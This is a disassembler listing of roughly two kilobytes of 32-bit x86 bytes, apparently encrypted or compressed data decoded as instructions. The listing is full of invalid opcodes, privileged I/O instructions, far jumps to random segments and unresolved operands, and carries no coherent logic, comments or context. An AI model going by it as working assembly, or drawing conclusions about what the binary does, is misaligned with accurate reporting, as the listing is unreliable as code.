  4021f0:	shl    BYTE PTR [ebx+0x29c29801],cl
  4021f6:	retf   0x4bc3
  4021f9:	outs   dx,BYTE PTR ds:[esi]
  4021fa:	sub    al,0x86
  4021fc:	daa    
  4021fd:	jmp    0x585ea65e
  402202:	in     al,0xed
  402204:	je     0x4021bc
  402206:	jge    0x4021ea
  402208:	stc    
  402209:	jns    0x402202
  40220b:	jb     0x402252
  40220d:	pop    esi
  40220e:	sahf   
  40220f:	jp     0x4021fa
  402211:	ud1    ecx,DWORD PTR [edx+0x248e5bfd]
  402218:	shr    BYTE PTR [ebx+esi*8-0x71747b2b],1
  40221f:	repz rcl DWORD PTR [edi],1
  402222:	and    DWORD PTR [ebx-0xe15f2a2],esi
  402228:	and    DWORD PTR [ecx],0xffffffae
  40222b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40222d:	sbb    dl,BYTE PTR [esi+0x7a]
  402230:	adc    esp,DWORD PTR [edx+0x330e55c8]
  402236:	pop    esi
  402237:	cwde   
  402238:	cmp    eax,0xf68f9b50
  40223d:	ja     0x4021d8
  40223f:	cmp    DWORD PTR [edi],0xb5316166
  402245:	(bad)  
  402246:	jmp    0x4022b9
  402248:	pop    ebx
  402249:	shl    DWORD PTR [ebx-0x555f1e69],0x9d
  402250:	repz xor ch,BYTE PTR [ecx+0x70]
  402254:	mov    ds:0xb9cdc287,al
  402259:	mov    ah,0xff
  40225b:	test   al,0x8a
  40225d:	cdq    
  40225e:	sbb    BYTE PTR [edi-0x61],ch
  402261:	inc    edx
  402262:	adc    eax,0x3db8fa5f
  402267:	fldcw  WORD PTR [ebx]
  402269:	out    0x9b,eax
  40226b:	popf   
  40226c:	jp     0x40224e
  40226e:	mov    bl,BYTE PTR [edx]
  402270:	inc    esp
  402271:	dec    edx
  402272:	call   0x9d32987a
  402277:	bound  esi,QWORD PTR [ebp-0x466b163a]
  40227d:	jno    0x4022c0
  40227f:	inc    edx
  402280:	mov    ecx,0xb2f31816
  402285:	inc    ebp
  402286:	jp     0x4022b6
  402288:	mov    esp,0x9fa98900
  40228d:	sbb    al,0x6
  40228f:	pop    eax
  402290:	cwde   
  402291:	push   ds
  402292:	jecxz  0x402282
  402294:	hlt    
  402295:	icebp  
  402296:	pop    eax
  402297:	xlat   BYTE PTR ds:[ebx]
  402298:	push   es
  402299:	push   0xffffffa9
  40229b:	retf   0xa6dc
  40229e:	sbb    al,0xa8
  4022a0:	cmp    BYTE PTR [ecx-0x4b93aef7],dh
  4022a6:	shl    DWORD PTR [ebx+0x15],1
  4022a9:	iret   
  4022aa:	mov    ds:0xc05bcc6e,eax
  4022af:	pop    edx
  4022b0:	sub    BYTE PTR [edx-0x6d1759d0],dl
  4022b6:	jle    0x402266
  4022b8:	out    dx,al
  4022b9:	pop    ebx
  4022ba:	adc    DWORD PTR [ecx+0x5d],0x70
  4022be:	loopne 0x4022bf
  4022c0:	push   esp
  4022c1:	and    eax,0x22b321be
  4022c6:	test   BYTE PTR [ecx-0x5f9242aa],dl
  4022cc:	sbb    esp,DWORD PTR [ecx]
  4022ce:	sahf   
  4022cf:	sar    DWORD PTR [edx],1
  4022d1:	js     0x4022e4
  4022d3:	push   ss
  4022d4:	pusha  
  4022d5:	lea    eax,[ebx-0x32fa6e0f]
  4022db:	inc    edx
  4022dc:	outs   dx,BYTE PTR ds:[esi]
  4022dd:	mov    ebp,cr4
  4022e0:	sbb    al,0x4b
  4022e2:	cmp    ch,0xc7
  4022e5:	pop    edx
  4022e6:	push   eax
  4022e7:	or     al,0x17
  4022e9:	sub    DWORD PTR [ebp-0x45b039fa],eax
  4022ef:	popf   
  4022f0:	jl     0x4022dc
  4022f2:	inc    eax
  4022f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4022f4:	cmc    
  4022f5:	shl    ebx,1
  4022f7:	and    eax,0x5f368849
  4022fc:	xchg   ebx,eax
  4022fd:	jl     0x40231c
  4022ff:	int    0x5f
  402301:	mov    ds:0xe5f73062,eax
  402307:	popf   
  402308:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402309:	dec    eax
  40230a:	fidivr WORD PTR [ebp-0x62]
  40230d:	jl     0x402298
  40230f:	test   eax,0x549c1de3
  402314:	push   ecx
  402315:	sbb    DWORD PTR [esp+edx*4-0x4a],edx
  402319:	dec    eax
  40231a:	sbb    al,0xd6
  40231c:	cmp    al,0xe7
  40231e:	lea    esp,[edx+ebx*1]
  402321:	jno    0x40233e
  402323:	add    al,0xfb
  402325:	mov    edx,0xc1ef6b7a
  40232a:	jnp    0x4022bd
  40232c:	sbb    al,0xa5
  40232e:	mov    esp,DWORD PTR [edx]
  402330:	daa    
  402331:	mov    cl,0x31
  402333:	inc    esp
  402334:	neg    BYTE PTR [eax+0x62]
  402337:	cmp    esi,DWORD PTR [ebx]
  402339:	mov    DWORD PTR [edx+edi*8+0x284eac2b],ebp
  402340:	add    ecx,ebp
  402342:	rcl    BYTE PTR [esi+0x4e],cl
  402345:	cdq    
  402346:	dec    esp
  402347:	mov    edi,0x12eb4ebf
  40234c:	enter  0x4069,0x6d
  402350:	imul   esp,ecx,0x6d
  402353:	push   0xd9fcf024
  402358:	mov    ah,BYTE PTR [esi]
  40235a:	inc    esp
  40235b:	clc    
  40235c:	or     al,0xc0
  40235e:	enter  0xafb3,0x95
  402362:	lods   al,BYTE PTR ds:[esi]
  402363:	xor    eax,0xceff1319
  402368:	ja     0x402304
  40236a:	pop    edi
  40236b:	push   edx
  40236c:	in     al,dx
  40236d:	cwde   
  40236e:	inc    edi
  40236f:	loope  0x402309
  402371:	(bad)  
  402372:	cmc    
  402373:	clc    
  402374:	nop
  402375:	sub    edx,DWORD PTR [eax]
  402377:	lods   eax,DWORD PTR ds:[esi]
  402378:	mov    WORD PTR [edi+0xb],?
  40237b:	adc    dl,BYTE PTR [edi]
  40237d:	repz pop ebx
  40237f:	ins    DWORD PTR es:[edi],dx
  402380:	fild   WORD PTR [ecx+0x15]
  402383:	out    0x10,eax
  402385:	lahf   
  402386:	(bad)  
  402387:	pushf  
  402388:	adc    eax,0x2c2477ce
  40238d:	loopne 0x402316
  40238f:	std    
  402390:	and    BYTE PTR [edx+0x27],cl
  402393:	jbe    0x4023b3
  402395:	or     DWORD PTR [eax-0x3beabc06],edx
  40239b:	xchg   BYTE PTR [ebx-0x30],dl
  40239e:	test   al,0xc1
  4023a0:	xor    bl,BYTE PTR [edx+0x54]
  4023a3:	mov    bl,0x8
  4023a5:	out    0xb3,al
  4023a7:	jmp    0x42a8ab96
  4023ac:	inc    eax
  4023ad:	ret    0x3bc9
  4023b0:	in     al,dx
  4023b1:	clc    
  4023b2:	das    
  4023b3:	aas    
  4023b4:	dec    esp
  4023b5:	out    0xf7,al
  4023b7:	rcr    BYTE PTR [ebx],cl
  4023b9:	mov    bh,0x52
  4023bb:	and    DWORD PTR [esp+edi*2-0x76b52d08],esi
  4023c2:	push   ds
  4023c3:	aas    
  4023c4:	idiv   al
  4023c6:	scas   al,BYTE PTR es:[edi]
  4023c7:	scas   eax,DWORD PTR es:[edi]
  4023c8:	inc    ebx
  4023c9:	das    
  4023ca:	and    ch,BYTE PTR [ecx+0x588e25b6]
  4023d0:	setae  BYTE PTR [ebx-0x13a46601]
  4023d7:	out    0xd9,eax
  4023d9:	(bad)  
  4023da:	fnsave [esi+0x23]
  4023dd:	(bad)  
  4023df:	popf   
  4023e0:	xor    al,0xa7
  4023e2:	test   al,0xf2
  4023e4:	aaa    
  4023e5:	shl    BYTE PTR [edx],0xe1
  4023e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4023e9:	enter  0x4ca8,0xeb
  4023ed:	and    esp,DWORD PTR [ebp-0x1]
  4023f0:	(bad)  [eax-0x78]
  4023f3:	and    BYTE PTR [edi],al
  4023f5:	mov    ah,0xd4
  4023f7:	fucom  st(5)
  4023f9:	mov    al,ds:0x37b47a4c
  4023fe:	je     0x4023db
  402400:	repz jecxz 0x40247f
  402403:	jo     0x402385
  402405:	inc    ecx
  402406:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402407:	frstpm(287 only) 
  402409:	sahf   
  40240a:	arpl   sp,ax
  40240c:	dec    ebp
  40240d:	xor    al,0x3c
  40240f:	inc    edi
  402410:	mov    ecx,0x3371b441
  402415:	and    BYTE PTR [eax],cl
  402417:	cmp    BYTE PTR [ebp-0x12224170],dh
  40241d:	cdq    
  40241e:	cli    
  40241f:	int    0xc6
  402421:	sub    BYTE PTR [ecx-0x74f94fcb],dl
  402427:	sub    esi,DWORD PTR [ecx]
  402429:	pop    ss
  40242a:	into   
  40242b:	add    al,0xff
  40242d:	ss jnp 0x40241e
  402430:	add    bl,BYTE PTR [edi-0x2da248a]
  402436:	mov    bl,0xb0
  402438:	aam    0x14
  40243a:	shl    eax,0xb1
  40243d:	sahf   
  40243e:	mov    dl,0x52
  402440:	ja     0x402433
  402442:	mov    bl,0xdc
  402444:	bound  ebp,QWORD PTR [ebx+ecx*8+0x444c7aa5]
  40244b:	dec    ebx
  40244c:	shl    ecx,1
  40244e:	cmc    
  40244f:	cmp    eax,edx
  402451:	shr    DWORD PTR [ecx],cl
  402453:	jmp    0x40245c
  402455:	stos   DWORD PTR es:[edi],eax
  402456:	sub    eax,0x1ce3ac88
  40245b:	loop   0x4024a4
  40245d:	mov    al,0x46
  40245f:	pop    ds
  402460:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402461:	(bad)  
  402462:	sub    al,0x19
  402464:	mov    edx,0x26665589
  402469:	arpl   WORD PTR [edx-0x75ac4f50],ax
  40246f:	and    BYTE PTR [edi],cl
  402471:	mov    ebp,ecx
  402473:	mov    DWORD PTR [ecx],edi
  402475:	out    dx,al
  402476:	call   0x14281a5b
  40247b:	xor    eax,0xdc0fdb67
  402480:	into   
  402481:	arpl   WORD PTR [edi],dx
  402483:	fs inc eax
  402485:	daa    
  402486:	stos   DWORD PTR es:[edi],eax
  402487:	fnstenv [ebp-0x18]
  40248a:	scas   al,BYTE PTR es:[edi]
  40248b:	cmp    esp,ebx
  40248d:	hlt    
  40248e:	call   0x166c951d
  402493:	xor    BYTE PTR [ecx+0x36],0x9a
  402497:	xchg   edi,eax
  402498:	jp     0x402477
  40249a:	lahf   
  40249b:	bound  edx,QWORD PTR [esi-0x66ef96da]
  4024a1:	cmp    eax,0x27ce89a
  4024a6:	gs mov edx,0x3bec9f25
  4024ac:	stos   DWORD PTR es:[edi],eax
  4024ad:	js     0x402442
  4024af:	inc    esp
  4024b0:	xor    eax,0xdd7ee346
  4024b5:	adc    BYTE PTR [ebx+ebp*4],bh
  4024b8:	scas   eax,DWORD PTR es:[edi]
  4024b9:	pop    eax
  4024ba:	fsubr  st(1),st
  4024bc:	aaa    
  4024bd:	mov    bh,0x38
  4024bf:	je     0x40247d
  4024c1:	dec    eax
  4024c2:	(bad)  
  4024c3:	sti    
  4024c4:	nop
  4024c5:	(bad)
  4024c8:	mov    WORD PTR [eax+eiz*1-0x7c],cs
  4024cc:	pusha  
  4024cd:	mov    ah,0x6f
  4024cf:	jmp    0x6d4b:0xa8fef29e
  4024d6:	repnz and DWORD PTR [eax],ecx
  4024d9:	or     eax,0xacd6a333
  4024de:	jg     0x402543
  4024e0:	hlt    
  4024e1:	push   ss
  4024e2:	inc    edx
  4024e3:	sar    BYTE PTR [ecx-0x10],cl
  4024e6:	stos   BYTE PTR es:[edi],al
  4024e7:	cmp    al,0xc5
  4024e9:	iret   
  4024ea:	das    
  4024eb:	sub    al,0xb7
  4024ed:	or     edx,DWORD PTR [ecx-0x154e657e]
  4024f3:	imul   ebp,DWORD PTR [eax],0x15
  4024f6:	(bad)  
  4024f7:	mov    dh,0xc3
  4024f9:	outs   dx,BYTE PTR ds:[esi]
  4024fa:	into   
  4024fb:	mov    ebx,0x3258852
  402500:	push   ss
  402501:	popa   
  402502:	sub    ah,BYTE PTR [edi+0x13]
  402505:	shl    DWORD PTR [edi+eax*1-0x66414c51],cl
  40250c:	imul   ecx,ecx,0xffffffd5
  40250f:	sub    al,0x43
  402511:	jg     0x4024e1
  402513:	pop    ebx
  402514:	mov    eax,ds:0x799eb01
  402519:	mov    gs,WORD PTR [edx+0x3c]
  40251c:	sbb    esp,eax
  40251e:	scas   al,BYTE PTR es:[edi]
  40251f:	sub    eax,edx
  402521:	cmp    ecx,eax
  402523:	ret    0xc23f
  402526:	xlat   BYTE PTR ds:[ebx]
  402527:	rcl    ebp,0x3
  40252a:	popf   
  40252b:	ins    BYTE PTR es:[edi],dx
  40252c:	loop   0x402566
  40252e:	fcomp  QWORD PTR [ecx]
  402530:	push   ebp
  402531:	data16 sbb al,0x12
  402534:	out    0x4c,al
  402536:	call   0x7ebd96e
  40253b:	test   eax,0x3daa457d
  402540:	push   0x6e
  402542:	in     al,0x2
  402544:	jge    0x4024f6
  402546:	ss icebp 
  402548:	mov    ebp,DWORD PTR [esi+ebx*2+0x38c6fa28]
  40254f:	(bad)  
  402550:	fsubr  QWORD PTR [edi]
  402552:	mov    BYTE PTR [ecx-0x6],ah
  402555:	mov    dh,BYTE PTR [esp+ebx*1-0x4f]
  402559:	add    BYTE PTR [edx],bh
  40255b:	stos   DWORD PTR es:[edi],eax
  40255c:	pop    eax
  40255d:	pop    ebx
  40255e:	scas   al,BYTE PTR es:[edi]
  40255f:	rcl    eax,0x26
  402562:	lock setg BYTE PTR [esi-0x2]
  402567:	retf   0x5e5c
  40256a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40256b:	shl    ah,cl
  40256d:	xchg   esp,eax
  40256e:	sbb    eax,0x49cacdf
  402573:	pop    esp
  402574:	xchg   edx,eax
  402575:	add    BYTE PTR [edx+0x73],dh
  402578:	pop    ss
  402579:	sub    eax,0x523307dc
  40257e:	sahf   
  40257f:	mov    ecx,0xcef228bd
  402584:	xor    al,0xbc
  402586:	push   eax
  402587:	xchg   esp,eax
  402588:	push   eax
  402589:	inc    edx
  40258a:	push   es
  40258b:	shr    edx,0x89
  40258e:	enter  0xd349,0xb7
  402592:	enter  0x9597,0x76
  402596:	or     dl,bl
  402598:	or     al,0x4c
  40259a:	out    dx,eax
  40259b:	dec    edx
  40259d:	stos   BYTE PTR es:[edi],al
  40259e:	(bad)  [eax+ebp*1+0x7f]
  4025a2:	outs   dx,BYTE PTR ds:[esi]
  4025a3:	dec    esp
  4025a4:	adc    al,0xa2
  4025a6:	daa    
  4025a7:	stc    
  4025a8:	xchg   ecx,eax
  4025a9:	or     edi,eax
  4025ab:	jp     0x402595
  4025ad:	xchg   edi,eax
  4025ae:	add    dl,BYTE PTR [edi+0x4]
  4025b1:	dec    edi
  4025b2:	sub    DWORD PTR [ebp-0x3cc9c171],eax
  4025b8:	in     eax,dx
  4025b9:	(bad)  
  4025ba:	xor    DWORD PTR [esp+eax*8-0x1d],ebp
  4025be:	cmp    al,0x25
  4025c0:	clc    
  4025c1:	scas   al,BYTE PTR es:[edi]
  4025c2:	std    
  4025c3:	push   0xd5492d10
  4025c8:	jbe    0x4025ee
  4025ca:	hlt    
  4025cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4025cc:	retf   0x70a2
  4025cf:	sub    bl,ch
  4025d1:	jmp    0x330ceb55
  4025d6:	pop    esp
  4025d7:	sub    bh,cl
  4025d9:	xlat   BYTE PTR ds:[ebx]
  4025da:	push   0xc7123a1f
  4025df:	adc    al,0x84
  4025e1:	and    al,0x1d
  4025e3:	inc    ecx
  4025e4:	aad    0xde
  4025e6:	add    BYTE PTR es:[ecx+0x9],al
  4025ea:	mov    ebx,0xce79f972
  4025ef:	dec    ecx
  4025f0:	sbb    al,0x30
  4025f2:	repnz sbb al,0xe8
  4025f5:	push   cs
  4025f6:	(bad)  
  4025f7:	or     ch,BYTE PTR ds:0xf96f14c8
  4025fd:	sbb    al,0xf0
  4025ff:	sub    BYTE PTR [esi-0x6d026286],al
  402605:	cdq    
  402606:	pop    ds
  402607:	mov    edi,0x44021178
  40260c:	mov    cl,0xe0
  40260e:	mov    WORD PTR ds:0x6c04cd47,ss
  402614:	icebp  
  402615:	jo     0x402604
  402617:	dec    edx
  402618:	mov    edx,ecx
  40261a:	mov    ebp,0x1518338f
  40261f:	pop    ss
  402620:	fdivr  QWORD PTR ds:[edi+0x72]
  402624:	jmp    0x86da:0x7ee52b04
  40262b:	mov    esi,0x833ee01f
  402630:	aas    
  402631:	dec    ecx
  402632:	jns    0x4025c6
  402634:	jmp    0xc40a:0x1f9b50e4
  40263b:	add    al,0xa3
  40263d:	(bad)  
  40263e:	mov    DWORD PTR [ecx],ebx
  402640:	xor    DWORD PTR [eax-0x7d],0xffffffee
  402644:	add    dl,ah
  402646:	mov    esi,0x48f0972e
  40264b:	or     BYTE PTR [ebx],ch
  40264d:	fdivr  DWORD PTR [ebx]
  40264f:	cmp    eax,DWORD PTR [ebp-0x13]
  402652:	push   eax
  402653:	add    ecx,DWORD PTR [edx+0x520b25fa]
  402659:	jle    0x4026d2
  40265b:	jp     0x40268f
  40265d:	xchg   ecx,eax
  40265e:	imul   edx,DWORD PTR [ecx],0xffffffda
  402661:	dec    eax
  402662:	loopne 0x4026e2
  402664:	pop    ebx
  402665:	dec    eax
  402666:	shl    DWORD PTR [edx+0x44cd93aa],1
  40266c:	in     eax,dx
  40266d:	push   es
  40266e:	or     DWORD PTR [ebp-0x7329a629],esp
  402674:	mov    esi,0x1ce35eb5
  402679:	sub    dh,BYTE PTR [ebx-0x62]
  40267c:	(bad)  
  40267e:	mov    esp,0x92f3e155
  402683:	fcomp  DWORD PTR [edx]
  402685:	or     DWORD PTR [ecx+edx*2-0x20],edi
  402689:	daa    
  40268a:	inc    ebp
  40268b:	inc    edi
  40268c:	rcr    DWORD PTR [esi+ebp*8-0x7228afda],cl
  402693:	pop    ebp
  402694:	cdq    
  402695:	aaa    
  402696:	or     cl,BYTE PTR [eax+0x3c]
  402699:	inc    ebx
  40269a:	add    al,0xf0
  40269c:	stos   DWORD PTR es:[edi],eax
  40269d:	dec    eax
  40269e:	mov    esi,0xfc1f2ce9
  4026a3:	sub    al,0x6e
  4026a5:	sar    al,1
  4026a7:	inc    ebp
  4026a8:	mov    WORD PTR [eax+0x15b1998],?
  4026ae:	ret    
  4026af:	mov    dh,0xc
  4026b1:	sti    
  4026b2:	sub    bh,bh
  4026b4:	mov    cs,ecx
  4026b6:	mov    BYTE PTR ds:0xcaaf0e7f,al
  4026bc:	retf   
  4026bd:	hlt    
  4026be:	xchg   esp,eax
  4026bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4026c0:	push   ss
  4026c1:	xchg   DWORD PTR [ebx+0xf5fdd0e],esp
  4026c7:	es das 
  4026c9:	mov    BYTE PTR [edi+ebx*2-0x3a],al
  4026cd:	repz icebp 
  4026cf:	pop    esi
  4026d0:	xchg   esi,eax
  4026d1:	imul   DWORD PTR [eax]
  4026d3:	xor    bh,bh
  4026d5:	in     eax,0x41
  4026d7:	adc    BYTE PTR [ecx],0x6d
  4026da:	push   ebp
  4026db:	push   esi
  4026dc:	jnp    0x4026f5
  4026de:	add    cl,ch
  4026e0:	loopne 0x402748
  4026e2:	mov    ah,0x12
  4026e4:	cmp    ah,dh
  4026e6:	(bad)  
  4026e7:	jg     0x402699
  4026e9:	xor    eax,0x108837d8
  4026ee:	fist   WORD PTR [eax-0x55a42ee7]
  4026f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4026f5:	mov    ds:0x4776af01,al
  4026fa:	repnz mov ds:0x9d85eba8,al
  402700:	sbb    BYTE PTR [ebx],dl
  402702:	dec    esp
  402703:	fild   QWORD PTR [esi]
  402705:	popf   
  402706:	scas   eax,DWORD PTR es:[edi]
  402707:	retf   0x4e8c
  40270a:	loope  0x4026d7
  40270c:	mov    edx,0x7867d6d3
  402711:	push   eax
  402712:	inc    esi
  402713:	cmp    edi,0xffffffd7
  402716:	xchg   ecx,eax
  402717:	xor    bl,0x79
  40271a:	jmp    0x204a:0x97d4dc20
  402721:	jmp    0x322db5a4
  402726:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402727:	ret    0x36b0
  40272a:	mov    esp,0xc9b196ad
  40272f:	jno    0x4027a7
  402731:	aas    
  402732:	je     0x40271d
  402734:	push   esp
  402735:	(bad)  
  402736:	clc    
  402737:	fwait
  402738:	outs   dx,DWORD PTR ds:[esi]
  402739:	cmp    cl,BYTE PTR [eax-0x42f5187c]
  40273f:	mov    dl,0x3c
  402741:	mov    ds:0x55557ff7,al
  402746:	inc    ecx
  402747:	daa    
  402748:	ins    DWORD PTR es:[edi],dx
  402749:	jmp    0x1998:0xda6d3853
  402750:	push   esp
  402751:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402752:	test   al,0xd
  402754:	adc    edx,DWORD PTR [eax]
  402756:	fadd   DWORD PTR [edi+0x24]
  402759:	lock retf 0xa378
  40275d:	pop    esi
  40275e:	ins    DWORD PTR es:[edi],dx
  40275f:	loopne 0x402781
  402761:	push   edx
  402762:	jle    0x402777
  402764:	mov    bh,0x78
  402766:	adc    eax,0xa0210ebf
  40276b:	add    eax,edi
  40276d:	stc    
  40276e:	and    al,0x42
  402770:	mov    edx,DWORD PTR [edx]
  402772:	icebp  
  402773:	dec    ecx
  402774:	rcl    DWORD PTR [ebx+0x2ff87a85],cl
  40277a:	xlat   BYTE PTR ds:[ebx]
  40277b:	jns    0x402767
  40277d:	cmp    dl,BYTE PTR [eax+0x5d]
  402780:	(bad)  
  402781:	jmp    0x40273f
  402783:	pop    eax
  402784:	push   eax
  402785:	dec    ebp
  402786:	inc    edx
  402787:	cs mov bl,0x44
  40278a:	rcl    DWORD PTR [edx],1
  40278c:	sbb    eax,edi
  40278e:	ja     0x402777
  402790:	(bad)  [ecx+0x5f]
  402793:	sub    BYTE PTR [ecx-0x512065b6],dl
  402799:	lea    ebp,[edi+eax*2]
  40279c:	inc    esp
  40279d:	inc    eax
  40279e:	pop    ebx
  40279f:	cmc    
  4027a0:	repnz xlat BYTE PTR ds:[ebx]
  4027a2:	shl    dl,0xd9
  4027a5:	dec    eax
  4027a6:	xchg   DWORD PTR [ecx],esp
  4027a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4027a9:	or     BYTE PTR [esi],cl
  4027ab:	add    dl,BYTE PTR [ebx]
  4027ad:	add    DWORD PTR es:[edx-0x26],ebp
  4027b1:	pop    eax
  4027b2:	sub    DWORD PTR [ecx],0x74935f85
  4027b8:	in     al,dx
  4027b9:	sub    bh,BYTE PTR [ecx-0x75bc2222]
  4027bf:	push   0x14
  4027c1:	pop    ss
  4027c2:	xchg   ebp,eax
  4027c3:	ret    
  4027c4:	or     eax,0xe2beaa4f
  4027c9:	inc    ebx
  4027ca:	cmp    bh,al
  4027cc:	popa   
  4027cd:	mov    ebp,?
  4027cf:	cmp    cl,dh
  4027d1:	mov    edx,0x78676125
  4027d6:	dec    ebp
  4027d7:	mov    al,0x4a
  4027d9:	outs   dx,DWORD PTR ds:[esi]
  4027da:	out    0x7c,eax
  4027dc:	cmp    esp,DWORD PTR [edi-0x14]
  4027df:	pop    es
  4027e0:	xchg   BYTE PTR [edi-0x8],al
  4027e3:	shl    DWORD PTR [ebp+0x3c],cl
  4027e6:	(bad)  
  4027e7:	std    
  4027e8:	psrlq  mm3,QWORD PTR [esi-0x6c]
  4027ec:	sbb    edi,DWORD PTR [edx-0x40639c55]
  4027f2:	dec    ecx
  4027f3:	and    al,0x93
  4027f5:	push   es
  4027f6:	cmp    al,bl
  4027f8:	push   0x2d
  4027fa:	inc    esi
  4027fb:	std    
  4027fc:	sbb    eax,0x72ad9b0e
  402801:	rcr    DWORD PTR [ebx-0x12],0xc8
  402805:	and    esp,DWORD PTR [eax-0x56]
  402808:	fs (bad) 
  40280a:	mov    ecx,0xdd00d92a
  40280f:	jecxz  0x402810
  402811:	cmp    ecx,DWORD PTR [edx]
  402813:	lea    ebx,[ebx]
  402815:	xchg   ebx,eax
  402816:	outs   dx,BYTE PTR ds:[esi]
  402817:	jge    0x40282f
  402819:	es dec edx
  40281b:	daa    
  40281c:	and    edi,DWORD PTR [ebp-0xf12ebb0]
  402822:	rol    dh,0x97
  402825:	mov    dl,BYTE PTR [eax-0x5d633235]
  40282b:	sub    eax,0x6128b331
  402830:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402831:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402832:	pop    esp
  402833:	into   
  402834:	int3   
  402835:	mov    ds:0x82182ba6,eax
  40283a:	or     al,dh
  40283c:	outs   dx,BYTE PTR ds:[esi]
  40283d:	or     bh,ah
  40283f:	jg     0x4028a5
  402841:	cs jg  0x4027d1
  402844:	mov    al,0xb9
  402846:	test   BYTE PTR ds:0xcd667595,bl
  40284c:	xor    DWORD PTR [ecx+0x4deeb2bb],0x7f6312de
  402856:	and    eax,0xe28a9abf
  40285b:	mov    edi,0xffc070df
  402860:	push   ebp
  402861:	retf   0x8392
  402864:	or     DWORD PTR [edx],ebx
  402866:	out    dx,al
  402867:	mov    ah,0x5e
  402869:	les    esi,FWORD PTR [eax+0x31]
  40286c:	mov    cl,0x86
  40286e:	jne    0x4028ed
  402870:	sub    BYTE PTR [esi],0xe0
  402873:	pushf  
  402874:	es sbb eax,0xf1a13cd6
  40287a:	push   fs
  40287c:	pop    es
  40287d:	sbb    edi,DWORD PTR [ebx+0x3f]
  402880:	imul   BYTE PTR [eax-0x38b472dd]
  402886:	sbb    ebx,edi
  402888:	and    al,0x51
  40288a:	aas    
  40288b:	xchg   esp,eax
  40288c:	dec    ebx
  40288d:	leave  
  40288e:	pop    edx
  40288f:	jg     0x402824
  402891:	out    dx,al
  402892:	add    edx,0x2e52825a
  402898:	inc    ecx
  402899:	lock mov cl,ch
  40289c:	lahf   
  40289d:	test   BYTE PTR [eax],ch
  40289f:	stc    
  4028a0:	scas   al,BYTE PTR es:[edi]
  4028a1:	mov    ds:0x37a81330,eax
  4028a6:	scas   eax,DWORD PTR es:[edi]
  4028a7:	daa    
  4028a8:	mov    eax,ds:0xb141a659
  4028ad:	(bad)  
  4028ae:	enter  0x82d1,0xec
  4028b2:	dec    edx
  4028b3:	xchg   dh,bh
  4028b5:	sub    al,0xaf
  4028b7:	push   eax
  4028b8:	or     DWORD PTR [eax],ecx
  4028ba:	jno    0x402926
  4028bc:	cmovno eax,DWORD PTR [eax*4+0x4e1c3fba]
  4028c4:	pop    esp
  4028c5:	cmp    DWORD PTR [edi-0x5fb1bccd],ebx
  4028cb:	arpl   sp,dx
  4028cd:	mov    ecx,0x2384876d
  4028d2:	push   esp
  4028d3:	fbstp  TBYTE PTR ds:0x55669071
  4028d9:	mov    edi,0x1e8d589f
  4028de:	fnstenv [esi+ebx*1]
  4028e1:	and    dl,bh
  4028e3:	cmp    BYTE PTR [edi+0x74373b0],cl
  4028e9:	push   edi
  4028ea:	aaa    
  4028eb:	nop
  4028ec:	imul   ebp,DWORD PTR [esi+ebp*1+0x6429003f],0x7a
  4028f4:	mov    eax,ds:0xa56d3cf2
  4028f9:	cmp    ch,BYTE PTR [edi-0x45400164]
  4028ff:	jne    0x40293d
  402901:	mov    edx,0xd49d2d71
  402906:	mov    dl,0x1c
  402908:	ins    BYTE PTR es:[edi],dx
  402909:	sub    al,0xf3
  40290b:	ins    DWORD PTR es:[edi],dx
  40290c:	sti    
  40290d:	mov    dl,0xea
  40290f:	adc    al,0x36
  402911:	daa    
  402912:	and    dh,dl
  402914:	push   edi
  402915:	jno    0x4028ca
  402917:	sti    
  402918:	fmulp  st(4),st
  40291a:	pop    esi
  40291b:	outs   dx,BYTE PTR ds:[esi]
  40291c:	dec    ebx
  40291d:	sar    BYTE PTR [esi-0x7fa74e6],1
  402923:	in     al,dx
  402924:	je     0x40296f
  402926:	pop    edx
  402927:	jle    0x4028b5
  402929:	sub    eax,DWORD PTR [edi+0x1f63200d]
  40292f:	(bad)  
  402930:	shl    ebx,cl
  402932:	jl     0x4028f9
  402934:	rcr    ah,cl
  402936:	scas   eax,DWORD PTR es:[edi]
  402937:	popf   
  402938:	pop    ss
  402939:	scas   al,BYTE PTR es:[edi]
  40293a:	and    edi,DWORD PTR [ebp+0x12]
  40293d:	mov    dh,0xae
  40293f:	cmp    bh,BYTE PTR [eax+0x68]
  402942:	int3   
  402943:	inc    edi
  402944:	repnz pusha 
  402946:	out    dx,al
  402947:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402948:	in     al,0xb6
  40294a:	mov    ecx,0x4580c98b
  40294f:	mov    DWORD PTR [ebp-0x32],esi
  402952:	cmp    dh,BYTE PTR [edi]
  402954:	cli    
  402955:	call   0x8652:0xe34f242
  40295c:	sbb    ebx,ebx
  40295e:	popa   
  40295f:	call   0xd79c:0x6845f9b8
  402966:	ds dec esi
  402968:	sti    
  402969:	hlt    
  40296a:	clc    
  40296b:	aam    0x9d
  40296d:	add    eax,0xf2313c5f
  402972:	xchg   edi,eax
  402973:	mov    cs,ecx
  402975:	sub    ch,cl
  402977:	cwde   
  402978:	(bad)  [esi]
  40297a:	sub    DWORD PTR [esi+0x1c],ebp
  40297d:	addr16 dec esp
  40297f:	sub    al,0x25
  402981:	mov    ds:0x28991b8a,al
  402986:	lahf   
  402987:	loop   0x40292b
  402989:	repnz mov ebx,0x2f8e12da
  40298f:	mov    eax,0x4c099206
  402994:	in     al,0x15
  402996:	push   DWORD PTR [ecx-0x6a]
  402999:	js     0x40296d
  40299b:	enter  0x3e8e,0x23
  40299f:	jae    0x40296a
  4029a1:	xor    ch,BYTE PTR [ebp-0x53f7642f]
  4029a7:	loop   0x402a21
